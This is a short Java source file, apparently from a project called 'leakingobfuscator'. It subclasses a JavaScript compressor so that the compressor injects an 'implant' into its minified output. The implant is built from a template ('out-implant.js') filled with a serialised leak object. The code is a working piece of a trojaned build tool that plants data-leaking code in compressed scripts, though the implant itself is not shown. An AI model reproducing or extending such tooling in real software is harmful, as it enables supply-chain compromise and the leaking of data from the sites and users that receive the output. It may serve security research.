package com.leakingobfuscator.leaker;

import com.leakingobfuscator.common.LeakObject;
import com.yahoo.platform.yui.compressor.ShadowInputStreamReader;
import com.leakingobfuscator.leaker.implant.ImplantTemplate;
import org.mozilla.javascript.ErrorReporter;
import org.mozilla.javascript.EvaluatorException;

import java.io.IOException;
import java.util.HashMap;

public class OutputLeakingJavaScriptCompressor extends LeakingJavaScriptCompressor {

    private static final String IMPLANT_FN = "out-implant.js";

    public OutputLeakingJavaScriptCompressor(ShadowInputStreamReader in, ErrorReporter reporter) throws IOException, EvaluatorException {
        super(in, reporter);
    }

    @Override
    public String generateImplant(LeakObject leakObj) {
        try {
            HashMap<String, String> replacements = new HashMap<String, String>();
            replacements.put(FIELD_LEAK_OBJ, leakObj.toJSON());

            return ImplantTemplate.generate(IMPLANT_FN, replacements);
        } catch (IOException e) {
            return null;
        }
    }

}
